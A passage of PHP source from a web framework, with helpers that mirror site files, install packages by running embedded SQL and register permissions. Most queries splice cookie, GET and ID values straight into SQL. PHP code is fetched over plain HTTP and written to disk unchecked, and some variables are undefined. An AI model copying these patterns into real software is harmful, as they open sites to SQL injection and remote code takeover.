          $z=overfile($mysrc,tostring(file_get_contents("http://".$host."/DNA/EXF/anyfuns.php?fid=getphptxt&furl=".$tmppt)));
        break;
        case "woff":          
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "woff2":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "font":
          $z=cdfile($usrc,$mysrc);
        break;
        case "wav":
          $z=cdfile($usrc,$mysrc);
        break;
        case "mp3":
          $z=cdfile($usrc,$mysrc);
        break;
        default:            
      }//     switch      
     }//如果文件存在就不下载了
     if ( $mysrc!=""){
       $alls=$alls+1;
       if (file_exists($mysrc)){
        $succ=$succ+1;
       }
     }
    }//pt i if not =""
  }//for
  return "{\"msg\":\"okay\",\"tot\":\"".$alls."\",\"succ\":\"".$succ."\"}";
}//DESCRIB ():  END@()
function downanyfile($usrc,$mysrc){//文件存不存在都下载，覆盖原来
  if ($rurl!="" and $mysrc!=""){
    $pathmy=urltopath($mysrc);
    $ptmy=explode(".",$mysrc);
    $totpt=count($ptmy);
    $kzm=$ptmy[$totpt-1];
   is_dir($pathmy) OR mkdir($pathmy, 0777, true); 
      switch($kzm){
        case "css":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "js":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "json":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "html":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "htm":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "gif":
          GrabImage($usrc, $mysrc);
        break;
        case "jpg":
          GrabImage($usrc, $mysrc);
        break;
        case "png":
          GrabImage($usrc, $mysrc);
        break;
        case "svg":
          $z=overfile($mysrc,file_get_contents($usrc));
        break;
        case "php":
          $z=overfile($mysrc,tostring(file_get_contents("http://".$host."/DNA/EXF/anyfuns.php?fid=getphptxt&furl=".$usrc)));
        break;
        case "woff":          
          $z=cdfile($usrc,$mysrc);
        break;
        case "woff2":
          $z=cdfile($usrc,$mysrc);
        break;
        case "font":
          $z=cdfile($usrc,$mysrc);
        break;
        case "wav":
          $z=cdfile($usrc,$mysrc);
        break;
        case "mp3":
          $z=cdfile($usrc,$mysrc);
        break;
        default:            
      }//     switch      
      if (file_exists($mysrc)){
        return true;
      }else{
        return false;
      }
  }else{
    return false;
  }
}//DESCRIB ():  END@()
function datatofun($fid,$fdata,$imk){
  $sqla="funname,funfull,oldfull,lastfull,CRTM,UPTM,OLMK,lang,CRTOR,VRT";
  $sqlb="'".$fid."()','".$fdata."','".$fdata."','".$fdata."',now(),now(),'".onlymark()."','php','".$_COOKIE["uid"]."','0'";
  $cz=UX("select count(*) as result from coode_funlist where funname='".$fid."()'");
  if (intval($cz)==0){
   $z=UX("insert into coode_funlist(".$sqla.")values(".$sqlb.")");   
    $cz=UX("select count(*) as result from coode_funlist where funname='".$fid."()'");
    if (intval($cz)>0){
      return true;
    }else{
      return false;
    }
  }else{
    return true;
  }  
}//DESCRIB ():  END@()
function datatocls($cid,$cdata,$imk){
  $sqla="funname,funfull,oldfull,lastfull,CRTM,UPTM,OLMK,lang,CRTOR,VRT";
  $sqlb="'".$cid."','".$cdata."','".$cdata."','".$cdata."',now(),now(),'".onlymark()."','php','".$_COOKIE["uid"]."','0'";
  $cz=UX("select count(*) as result from coode_phpcls where funname='".$cid."()'");
  if (intval($cz)==0){
   $z=UX("insert into coode_phpcls(".$sqla.")values(".$sqlb.")");   
    $cz=UX("select count(*) as result from coode_phpcls where funname='".$cid."()'");
    if (intval($cz)>0){
      return true;
    }else{
      return false;
    }
  }else{
    return true;
  }  
}//DESCRIB ():  END@()
function syspagepmt($cid){
  $pgrst=SX("select tinymark,sysid from coode_tiny where STATUS=1");
  $totpg=countresult($pgrst);
  for ($i=0;$i<$totpg;$i++){
    if (anyvalue($pgrst,"tinymark",$i)!=""){
     $z=makepagepmt(anyvalue($pgrst,"tinymark",$i),anyvalue($pgrst,"sysid",$i));
     $z=makecompagebw(anyvalue($pgrst,"tinymark",$i),$cid,anyvalue($pgrst,"sysid",$i));
    };
  };
  return true;
}
function makecomtabbw($tabid,$comid,$sysid){
    if ($tabid!="" and $comid!="" and $sysid!=""){
      $tbtt=UX("select tabtitle as result from coode_tablist where TABLE_NAME='".$tabid."'");
      $sqlx="tabname,pertitle,comid,sysid,starttime,endtime";
      $sqly="'".$tabid."','".$tbtt."','".$comid."','".$sysid."',now(),now()";
      $z=UX("insert into coode_tabbwclist(".$sqlx.")values(".$sqly.")");
      return true;
    }else{
      return false;
    }
}
function makecomfunbw($funid,$comid,$sysid){
    if ($funid!="" and $comid!="" and $sysid!=""){
      $funtt=UX("select funcname as result from coode_funlist where funname='".$funid."' or funname='".$funid."()'");
      $sqlx="funid,pertitle,comid,sysid,starttime,endtime";
      $sqly="'".$funid."','".$funtt."','".$comid."','".$sysid."',now(),now()";
      $z=UX("insert into coode_funbwclist(".$sqlx.")values(".$sqly.")");
      return true;
    }else{
      return false;
    }
}
function makecompagebw($pageid,$comid,$sysid){
    if ($pageid!="" and $comid!="" and $sysid!=""){
     $pagett=UX("select tinytitle as result from coode_tiny where tinymark='".$pageid."' ");
     $sqlx="pagemark,pertitle,comid,sysid,starttime,endtime";
     $sqly="'".$pageid."','".$pagett."','".$comid."','".$sysid."',now(),now()";
     $z=UX("insert into coode_pagebwclist(".$sqlx.")values(".$sqly.")");
     return true;
    }else{
     return false;
    }
}
function makecomappbw($comid){
    if ($comid!="" ){
        $z=UX("insert into coode_appstatelist(sysid,comid,pertitle,scvid,appid,starttime,endtime,CRTM,UPTM,STATUS)select sysid,'".$comid."',appname,'',appid,now(),now(),now(),now(),1 from coode_appdefault where STATUS=1 and concat('".$comid."',appid) not in(select concat(comid,appid) from coode_appstatelist)");
        return true;
    }else{
        return false;
    }
}
function maketabpmt($tabid,$sysid){
    if ($tabid!="" and $sysid!=""){
        $tbtt=UX("select tabtitle as result from coode_tablist where TABLE_NAME='".$tabid."'");
  $sqla="sysid,permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,valx,dataarea";
  $sqlb="'".$sysid."','".$sysid."-".$tabid.":insert','".$tbtt."新增','','compid','groupid',1,'clientid','data','mysql','insert',1,'DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,'";
  $zz=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
  $sqla="sysid,permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,valx,dataarea";
  $sqlb="'".$sysid."','".$sysid."-".$tabid.":update','".$tbtt."更改','','compid','groupid',1,'clientid','data','mysql','update',1,'DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,'";
  $zz=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
  $sqla="sysid,permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,valx,dataarea";
  $sqlb="'".$sysid."','".$sysid."-".$tabid.":select','".$tbtt."选择','','compid','groupid',1,'clientid','data','mysql','select',1,'DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,'";
  $zz=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
  $sqla="sysid,permid,permtitle,appid,compid,groupid,grpvalx,clientid,metcls,method,behiver,valx,dataarea";
  $sqlb="'".$sysid."','".$sysid."-".$tabid.":delete','".$tbtt."删除','','compid','groupid',1,'clientid','data','mysql','delete',1,'DA:selfitem,DA:selfpos,DA:sonpos,DA:selfandsonpos,DA:selfleaddepart,'";
  $zz=UX("insert into coode_tpmtsys(".$sqla.")values(".$sqlb.")");
  return true;
    }else{
        return false;
    }
}
function makefunpmt($funid,$sysid){
    if ($funid!="" and $sysid!=""){
  $funtt=UX("select funcname as result from coode_funlist where funname='".$funid."' or funname='".$funid."()'");
  $sqla="funid,pertitle,comid,roleid,clientid,shortid,valx,reurl,appid,sysid,starttime,endtime";
  $sqlb="'".$funid."','".$funtt."','comid','roleid','clientid','shortid',1,'','','".$sysid."',now(),now()";
  $zz=UX("insert into coode_fpmtsys(".$sqla.")values(".$sqlb.")");
  return true;
    }else{
        return false;
    }
}
function makepagepmt($pgmk,$sysid){
    if ($pgmk!="" and $sysid!=""){
      $pagett=UX("select tinytitle as result from coode_tiny where tinymark='".$pgmk."' ");
      $sqla="pagemark,pertitle,comid,roleid,clientid,shortid,valx,reurl,appid,sysid,starttime,endtime";
      $sqlb="'".$pgmk."','".$pagett."','comid','roleid','clientid','shortid',1,'','','".$sysid."',now(),now()";
      $zz=UX("insert into coode_ppmtsys(".$sqla.")values(".$sqlb.")");
      return true;
    }else{
        return false;
    }
}
function changeist($strx){
  if (strpos($strx,"('")>0 ){
    $ptist=explode("('",$strx);
    $totpt=count($ptist);
    for ($i=0;$i<$totpt;$i++){
      $tmppt=qian($ptist[$i],"')");
      $tmppx=qian($ptist[$i],"')");
      $tmppt=str_replace("∨","','",$tmppt);
      $strx=str_replace("('".$tmppx."')","('".$tmppt."')",$strx);
    };
    return $strx;
  }else{
    return $strx;
  }
}
function runinstall($x,$y,$z,$i){ 
 if ($z!=""){  
   $sysid=$_GET["sysid"];
   $z=$z."@@@@";
   $ptz=explode("@@@@",$z);
   $totp=count($ptz);
   $succ=0;
   $xyz="";
   $abc="";
  for ($i=0;$i<$totp;$i++){
   if ($ptz[$i]!=""){
    $tmpq=qian($ptz[$i],"/");    
    $fcid=qian(hou($ptz[$i],"/"),":");
    $tmph=hou($ptz[$i],":"); 
    switch($tmpq){
      case "CREATE":
      
      $tmptab=qian(hou($ptz[$i],"/"),":");      
      if (_get("drop")=="1"){
          $conn=mysql_connect(gl(),glu(),glp());
          $extx=updatingx($conn,glb(),"DROP TABLE IF EXISTS ".$tmptab,"utf8");
      }
      $conn=mysql_connect(gl(),glu(),glp());
      $extx=updatingx($conn,"information_schema","select count(*) as result from TABLES where TABLE_NAME='".$tmptab."' and TABLE_SCHEMA='".glb()."'","utf8");      
        if (intval($extx)==0){         
         if ($tmph!=""){
           $z=maketabpmt($tmptab,$sysid);
           $conn=mysql_connect(gl(),glu(),glp());            
           $x=updatingx($conn,glb(),$tmph,"utf8");           
           $conn=mysql_connect(gl(),glu(),glp());           
           $extj=updatingx($conn,"information_schema","select count(*) as result from TABLES where TABLE_NAME='".$tmptab."'  and TABLE_SCHEMA='".glb()."'","utf8");
           if (intval($extj)>0){
            $succ=$succ+1;
             $abc=$abc."crttable:".$tmptab.";";
           }else{
             $xyz=$xyz."crttable:".$tmptab.";";
           }
         }else{           
           $succ=$succ+1;
         }
        }else{
           $succ=$succ+1;
        }
      break;
      case "fun":
        $z=makefunpmt($fcid,$sysid);
        if (datatofun($fcid,$tmph,$i)){
          $succ=$succ+1;
          $abc=$abc."crtfun:".$fcid.";";
        }else{
          $xyz=$xyz."crtfun:".$fcid.";";
        }
      break;
      case "cls":        
        if (datatocls($fcid,$tmph,$i)){
          $succ=$succ+1;
          $abc=$abc."crtcls:".$fcid.";";
        }else{
          $xyz=$xyz."crtcls:".$fcid.";";
        }
      break;
      default:
       if (strpos("xxx".$tmpq,"insert")>0){
           $tmptab=qian(hou($ptz[$i],"/"),"----");
           $tmptolmk=qian(hou($ptz[$i],"----"),":");
         if (_get("drop")=="1"){
          $conn=mysql_connect(gl(),glu(),glp());
          $etx=updatingx($conn,glb(),"delete from ".$tmptab." where OLMK='".$tmptolmk."'","utf8");
         }
         $extj=UX("select count(*) as result from ".$tmptab." where OLMK='".$tmptolmk."'");
         if (intval($extj)==0){
           if ($tmph!=""){
             $tmph=changeist($tmph);
             $tmph=str_replace("'","\\'",$tmph);
             $tmpq=str_replace("[DATA]",$tmph,$tmpq);        
             $tmpq=str_replace("∨","','",$tmpq);
             $tmpq=str_replace("〖","'",$tmpq);
             $tmpq=str_replace("〗","'",$tmpq);
             $conn=mysql_connect(gl(),glu(),glp());
             $x=updatingx($conn,glb(),$tmpq,"utf8");                          
             $exti=UX("select count(*) as result from ".$tmptab." where OLMK='".$tmptolmk."'");             
             if (intval($exti)>0){
              $succ=$succ+1;
               $abc=$abc.$tmptab.":".$tmptolmk.";";
             }else{
               $xyz=$xyz.$tmptab.":".$tmptolmk."{".$tmpq."};";
             };    
           }else{             
             $succ=$succ+1;
             $abc=$abc.$tmptab.":".$tmptolmk.";";
           }
          }else{
            $succ=$succ+1;
            $abc=$abc.$tmptab.":".$tmptolmk.";";
          }
        }else{
         $succ=$succ+1;          
        }
    }; //switch
   }else{
     $succ=$succ+1; 
   };//ifptz
  };//for
  if ($succ>=$totp){
    return "1:succ-".$succ."/".$totp."----SUCCESS/".$abc."FAILURE/".$xyz;
  }else{         
    return "0:fail-".$succ."/".$totp."----SUCCESS/".$abc."FAILURE/".$xyz;
  }
 }else{                  
   return "1:null";
 }        
}//DESCRIB ():  END@()
function unittree($pd,$um){
  $rtnstr="";  
  if (substr(str_replace("\\","/",$_SERVER['DOCUMENT_ROOT']),-1)!="/"){
    $gml=str_replace("\\","/",$_SERVER['DOCUMENT_ROOT'])."/";
  }else{
    $gml=str_replace("\\","/",$_SERVER['DOCUMENT_ROOT']);
  };
    
   $exty=UX("select count(*) as result from coode_cssunit where unitid='".$um."'");
   if (intval($exty)>0){
     $z=UX("update coode_cssunit set UPTM=now() where unitid='".$um."'");
   }else{
     $z=UX("insert into coode_cssunit(unitid,unittitle,OLMK,CRTM,UPTM)values('".$um."','','".onlymark()."',now(),now())");
   };
   $pathdir=combineurl($gml,$pd);  
   $extx=UX("select count(*) as result from coode_sitefile where updateurl='".$pd."'");
    if (intval($extx)>0){
     $x=UX("update coode_sitefile set PTOF='".$um."' where updateurl='".$pd."'");
    }else{
     $ptpd=explode("/",$pd);
     $totp=count($ptpd);
     $fnm=$ptpd[$totp-1];
     $flen=strlen($fnm);
     $dirx=substr($pd,0,strlen($pd)-$flen);
     $diry=str_replace($gml,"/",$dirx);
     $y=UX("insert into coode_sitefile(filename,filecname,filetype,PTOF,folder,updateurl,CRTM,UPTM,CRTOR,RIP,OLMK)values('".$fnm."','".$fnm."','folder','".$um."','".$diry."','".$pd."',now(),now(),'".$_COOKIE["uid"]."','".getip()."','".onlymark()."')");
    }    
  if(is_empty_dir($pathdir)){       
    $rtnstr=$rtnstr."成功单元化目录".$pathdir."<br />";
   }else{//否则读这个目录，除了.和..外 
     $d=dir($pathdir); 
    while($a=$d->read()) { 
      if(is_file($pathdir.'/'.$a) && ($a!='.') && ($a!='..')){
         //unlink($pathdir.'/'.$a);
         $extx=UX("select count(*) as result from coode_sitefile where updateurl='".$pd."/".$a."'");
        if (intval($extx)>0){
         $x=UX("update coode_sitefile set PTOF='".$um."' where updateurl='".$pd."/".$a."'");
        }else{
         $ptpd=explode("/",$pd."/".$a);
         $totp=count($ptpd);
         $fnm=$a;
         //$ptpd[$totp-1];
         $flen=strlen($fnm);
         $dirx=substr($pd."/".$a,0,strlen($pd."/".$a)-$flen);
         $diry=str_replace($gml,"/",$dirx);
         $y=UX("insert into coode_sitefile(filename,filecname,filetype,PTOF,folder,updateurl,CRTM,UPTM,CRTOR,RIP,OLMK)values('".$fnm."','".$fnm."','file','".$um."','".$diry."','".$pd."/".$a."',now(),now(),'".$_COOKIE["uid"]."','".getip()."','".onlymark()."')");
        }            
         $rtnstr=$rtnstr."成功单元化文件".$pathdir."/".$a."<br />";
       }  //如果是文件就直接删除 
      if(is_dir($pathdir.'/'.$a) && ($a!='.') && ($a!='..')) {//如果是目录 
                      
            $extx=UX("select count(*) as result from coode_sitefile where updateurl='".$pd."/".$a."'");
            if (intval($extx)>0){
              $x=UX("update coode_sitefile set PTOF='".$um."' where updateurl='".$pd."/".$a."'");
            }else{
              $ptpd=explode("/",$pd."/".$a);
              $totp=count($ptpd);
              $fnm=$a;
              //$ptpd[$totp-1];
              $flen=strlen($fnm);
              $dirx=substr($pd."/".$a,0,strlen($pd."/".$a)-$flen);
              $diry=str_replace($gml,"/",$dirx);
              $y=UX("insert into coode_sitefile(filename,filecname,filetype,PTOF,folder,updateurl,CRTM,UPTM,CRTOR,RIP)values('".$fnm."','".$fnm."','folder','".$um."','".$diry."','".$pd."/".$a."',now(),now(),'".$_COOKIE["uid"]."','".getip()."')");
             }            
              $rtnstr=$rtnstr."成功单元化目录".$pathdir."/".$a."<br />";
           
           if(!is_empty_dir($pathdir.'/'.$a)) {//是否为空
            //如果不是，调用自身，不过是原来的路径+他下级的目录名 
            $rtnstr=$rtnstr.unittree($pd.'/'.$a,$um); 
           }else{
           }
       } 
     }//while 
     $z=UX("update coode_sitefile set folder=replace(folder,'//','/'),updateurl=replace(updateurl,'//','/') where PTOF='".$unitmark."'");
    $d->close();   
  } //empty
  return "{\"msg\":\"okay\",\"rst\":\"".$rtnstr."\"}";
}//DESCRIB ():  END@()
function makecore(){
  $coretxt=file_get_contents(combineurl(localroot(),"/RNA/EARTH.php"));
  $coretxt=str_replace('<?php','',$coretxt);
  $coretxt=str_replace('?>','',$coretxt);
  $coretxt=str_replace("gl(){return \"".gl()."\"","gl(){return \"[gl]\"",$coretxt);
  $coretxt=str_replace("glu(){return \"".glu()."\"","glu(){return \"[glu]\"",$coretxt);
  $coretxt=str_replace("glp(){return \"".glp()."\"","glp(){return \"[glp]\"",$coretxt);
  $coretxt=str_replace("glb(){return \"".glb()."\"","glb(){return \"[glb]\"",$coretxt);
  $coretxt=str_replace("gln(){return \"".gln()."\"","gln(){return \"[gln]\"",$coretxt);
  $coretxt=str_replace("glt(){return \"".glt()."\"","glt(){return \"[glt]\"",$coretxt);
  $coretxt=str_replace("glm(){return \"".glm()."\"","glm(){return \"[motherhost]\"",$coretxt);
  $coretxt=str_replace("glr(){return \"".glr()."\"","glr(){return \"[regcode]\"",$coretxt);
  $z=overfile(combineurl(localroot(),"/DNA/DFT/EARTH.txt"),$coretxt);
  return true;
}//DESCRIB ():  END@()
function newsyscoretabfun($sysid){
  $z=UX("delete from coode_shortaffect where pageid='".$sysid."'");
  $k=UX("delete from coode_pagefuntab where sysid='".$sysid."' and (pagemark='coodecore' or pagemark='funlist' or pagemark='tablist')");
  
  $k=UX("delete from coode_pagefuntab where sysid='".$sysid."' and sourcecls='tab' and sourceid in (select TABLE_NAME from coode_tablist where issys=1)");
  $k=UX("delete from coode_pagefuntab where sysid='".$sysid."'  and sourcecls='fun' and sourceid in (select replace(funname,'()','') from coode_funlist where issys=1)");
  $sqla="sysid,appid,pagemark,sourcecls,starttime,endtime,UPTM,CRTM,sourceid,sdata";
  $sqlb="'".$sysid."','coodecore','coodecore','tab',now(),now(),now(),now()";
  $x=UX("insert into coode_pagefuntab(".$sqla.")select ".$sqlb.",TABLE_NAME,createsql from coode_tablist where issys=1 and TABLE_NAME not in(select sourceid from coode_pagefuntab where sysid='".$sysid."')");  
  $sqlb="'".$sysid."','tablist','tablist','tab',now(),now(),now(),now()";
  $x=UX("insert into coode_pagefuntab(".$sqla.")select ".$sqlb.",TABLE_NAME,createsql from coode_tablist where sysid='".$sysid."' and TABLE_NAME not in(select sourceid from coode_pagefuntab where sysid='".$sysid."')");  
  $sqla="sysid,appid,pagemark,sourcecls,starttime,endtime,UPTM,CRTM,sourceid,sdata";
  $sqlb="'".$sysid."','coodecore','coodecore','fun',now(),now(),now(),now()";
  $y=UX("insert into coode_pagefuntab(".$sqla.")select ".$sqlb.",replace(funname,'()',''),funfull from coode_funlist where issys=1 and replace(funname,'()','') not in(select sourceid from coode_pagefuntab where sysid='".$sysid."')");  
  $sqlb="'".$sysid."','funlist','funlist','fun',now(),now(),now(),now()";
  $y=UX("insert into coode_pagefuntab(".$sqla.")select ".$sqlb.",replace(funname,'()',''),funfull from coode_funlist where sysid='".$sysid."' and replace(funname,'()','') not in(select sourceid from coode_pagefuntab where sysid='".$sysid."')");  
  $sqla="sysid,appid,pagemark,sourcecls,starttime,endtime,UPTM,CRTM,sourceid,sdata";
  $sqlb="'".$sysid."','coodecore','coodecore','cls',now(),now(),now(),now()";
  $y=UX("insert into coode_pagefuntab(".$sqla.")select ".$sqlb.",replace(funname,'()',''),funfull from coode_phpcls where issys=1 and replace(funname,'()','') not in(select sourceid from coode_pagefuntab where sysid='".$sysid."')");  
  $sqla="sysid,appid,pagemark,sourcecls,starttime,endtime,UPTM,CRTM,sourceid,sdata";
  $sqlb="'".$sysid."','coodecore','coodecore','cls',now(),now(),now(),now()";
  $y=UX("insert into coode_pagefuntab(".$sqla.")select ".$sqlb.",replace(funname,'()',''),funfull from coode_phpcls where sysid='".$sysid."' and replace(funname,'()','') not in(select sourceid from coode_pagefuntab where sysid='".$sysid."')");  
  return true;
}//DESCRIB ():  END@()
function updatingtemp($con,$db,$sqlstr,$lan){
 //mysql_select_db($db, $con);
 //mysql_query("SET NAMES ".$lan); 
 //$result = mysql_query($sqlstr);
  $con -> query("set names '".$lan."'"); //数据库输出编码 应该与你的数据库编码保持一致.建议用UTF-8 国际标准编码.
  $con -> select_db($db); //打开数据库
  
  $result = $con->query($sqlstr); //查询成功
 if (strpos($sqlstr,"result")>0)
  {
   while($row = mysqli_fetch_array($result))
   {
   return $row["result"];
   }
 }else
 {
  return "Success";
  };
 mysqli_close($con);
}//DESCRIB ():  END@()

function curPageURL() 
{
    $pageURL = 'http';
    //if ($_SERVER["HTTPS"] == "on") 
//    {
 //       $pageURL .= "s";
 //   }
    $pageURL .= "://";
    if ($_SERVER["SERVER_PORT"] != "80") 
    {
        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];
    } 
    else 
    {
        $pageURL .=$_SERVER['QUERY_STRING'];// $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"].$_SERVER['HTTP_REFERER'].
    }
    return $pageURL;
}//DESCRIB ():  END@()
function ipToArea($ip=""){
    $api="http://sp0.baidu.com/8aQDcjqpAAV3otqbppnN2DJv/api.php?query=".$ip."&co=&resource_id=6006";
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$api);
    curl_setopt($ch,CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);
    //curl_setopt($ch,CURLOPT_HTTPHEADER,C('IP138_TOKEN'));//undefined c
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
    curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,3);
    $handles = curl_exec($ch);
    curl_close($ch);
    $handles= iconv('GB2312', 'UTF-8', $handles);
    $arr=json_decode($handles,true);
    return $arr[data][0][location];
}//DESCRIB ():  END@()
function getip(){
global $ip;
if (getenv("HTTP_CLIENT_IP"))
  $ip = getenv("HTTP_CLIENT_IP");
 else if(getenv("HTTP_X_FORWARDED_FOR"))
  $ip = getenv("HTTP_X_FORWARDED_FOR");
 else if(getenv("REMOTE_ADDR"))
  $ip = getenv("REMOTE_ADDR");
 else $ip = "Unknow";
return $ip;
}//DESCRIB ():  END@()
function excurl($urlx){
  if (strpos($urlx,"://")>0 or substr($urlx,0,2)=="//" ){
    $urlx=hou($urlx,"//");      
  }
  $urlx=qian($urlx,"?");
  $urlx=str_replace("/","_",$urlx);
  $urlx=str_replace(":","-",$urlx);
  return $urlx;
}//DESCRIB ():  END@()
function absorbimgs($textx,$mimgs=array(array())){
  $pattern="/<[img|IMG].*?src=[\'|\"](.*?(?:[\.gif|\.png|\.svg|\.jpg]))[\'|\"].*?[\/]?>/";
  preg_match_all($pattern,$textx,$mimgs);
  return $mimgs;
}//DESCRIB ():  END@()
function isimage($xurl){
  if ((strpos($xurl,".jpg")>0 or strpos($xurl,".png")>0 or strpos($xurl,".gif")>0 or strpos($xurl,".svg")>0) and strpos("xx".$xurl," ")<=0 and  strpos("xx".$xurl,"\"")<=0 and  strpos("xx".$xurl,"'")<=0 ){
    return true;
  }else{
    return false;
  }
}//DESCRIB ():  END@()
function isfunc($srcid,$longexp){
  if (strpos($longexp,".php?fid=".$srcid)>0 and strpos($srcid,"&")<=0  and strpos($srcid,"+")<=0  and strpos($srcid,"\"")<=0  and strpos($srcid," ")<=0){
    return true;
  }else{
    $longexp=str_replace("'","",$longexp);
    $longexp=str_replace("\"","",$longexp);
    $longexp=str_replace(" ","",$longexp);
    if (strpos("xx".$longexp,"F(".$srcid.",")>0){
      return true;
    }else{
      return false;
    }
  }
}//DESCRIB ():  END@()
function absorburls($textx,$mimgs=array()){
  $marr=array(array());
  $m=0;
  $pattern="/background.*?url\((.*?)\).*?;/";
  preg_match_all($pattern,$textx,$marr);  
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  return $mimgs;
}//DESCRIB ():  END@()
function absorbpics($textx,$mimgs=array()){
  $marr=array(array());
  $m=0;
  $pattern="/<.*?src.*?\"(.*?\..*?)\".*?>/";
  preg_match_all($pattern,$textx,$marr);  
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $pattern="/<.*?SRC.*?\"(.*?\..*?)\".*?>/";
  preg_match_all($pattern,$textx,$marr);  
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $pattern="/ .*?src.*?\"(.*?\..*?)\".*?;/";
  preg_match_all($pattern,$textx,$marr);
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $pattern="/ .*?SRC.*?\"(.*?\..*?)\".*?;/";
  preg_match_all($pattern,$textx,$marr);
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }  
  //-----------------单引号
$pattern="/<.*?src.*?\'(.*?\..*?)\'.*?>/";
  preg_match_all($pattern,$textx,$marr);  
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $pattern="/<.*?SRC.*?\'(.*?\..*?)\'.*?>/";
  preg_match_all($pattern,$textx,$marr);  
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }  
  $pattern="/ .*?src.*?\'(.*?\..*?)\'.*?;/";
  preg_match_all($pattern,$textx,$marr);
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }  
  $pattern="/ .*?SRC.*?\'(.*?\..*?)\'.*?;/";
  preg_match_all($pattern,$textx,$marrs);
  for ($i=0;$i<count($marr[1]);$i++){
    if (isimage($marr[1][$i])){
      $mimgs[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  return $mimgs;
}//DESCRIB ():  END@()
function saveimgto($temppic,$burl,$svtop){
  if ($temppic!="" and $burl!="" and $svtop!=""){
            $bburl=urltopath($burl);
               if (strpos($temppic,"://")>0 or  substr($temppic,0,1)=="/" or  substr($temppic,0,2)=="//"){
                 if (substr($temppic,0,1)=="/" and substr($temppic,0,2)!="/"){ 
                   $tempurl=$temppic; //这里确定好 CSS的实际相对地址 css文件是相对他自己这个文件位置而言
                 }else{
                   $tempurl=$temppic; //这里确定好 CSS的实际相对地址 css文件是相对他自己这个文件位置而言
                 }
               }else{
                  $tempurl=connurl($bburl,$temppic); //这里确定好 CSS的实际相对地址 css文件是相对他自己这个文件位置而言                  
               };
                   $fexd=hou($tempurl,"//");
                   $fexd=qian($fexd,"?");
                   $fexd=str_replace("_","/",$fexd);
                   $fexd=str_replace("-",":",$fexd);    
                  if (strpos("xx".$tmpurl,localroot())>0){
                       $downurl=str_replace(localroot(),"//".glw(),$tmpurl);
                  }else{
                       $downurl=$tmpurl;
                  }
              if (substr($tempurl,0,2)=="//" or strpos($tempurl,"://")>0){               
                 GrabImage($downurl, combineurl($svtop."/",excurl($tempurl)));
             }else{
               if (substr($tempurl,0,1)=="/"){
                copy_filetodir(combineurl(localroot(),$tempurl),$svtop);                
               }else{
                copy_filetodir($tempurl,$svtop);                
               }
               rename(combineurl($svtop,urlfname($temppic)), combineurl($svtop,excurl($tempurl)));
             }
                  
     return "images/".excurl($tempurl);
  }else{
     return $temppic;
  }
}//DESCRIB ():  END@()
function absorbfuns($textx,$mfuns=array()){
  $m=0;
  $marr=array(array());
  $pattern="/.*?\.php\?fid=(.*?)\'/";
  preg_match_all($pattern,$textx,$marr);  
  for ($i=0;$i<count($marr[1]);$i++){  
    if (isfunc($marr[1][$i],$marr[0][$i])){
      $mfuns[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $pattern="/.*?\.php\?fid=(.*?)\"/";
  preg_match_all($pattern,$textx,$marr);
  for ($i=0;$i<count($marr[1]);$i++){    
    if (isfunc($marr[1][$i],$marr[0][$i])){
      $mfuns[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $pattern="/.*?\.php\?fid=(.*?)\&/";
  preg_match_all($pattern,$textx,$marr);
  for ($i=0;$i<count($marr[1]);$i++){    
    if (isfunc($marr[1][$i],$marr[0][$i])){
      $mfuns[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
  $pattern="/F.*?\(.*?\'(.*?)\'.*?\)/";
  preg_match_all($pattern,$textx,$marr);
  for ($i=0;$i<count($marr[1]);$i++){
    if (isfunc($marr[1][$i],$marr[0][$i])){
      $mfuns[$m]=$marr[1][$i];
      $m=$m+1;
    }
  }
$pattern="/F.*?\(.*?\"(.*?)\".*?\)/";
  preg_match_all($pattern,$textx,$marr);
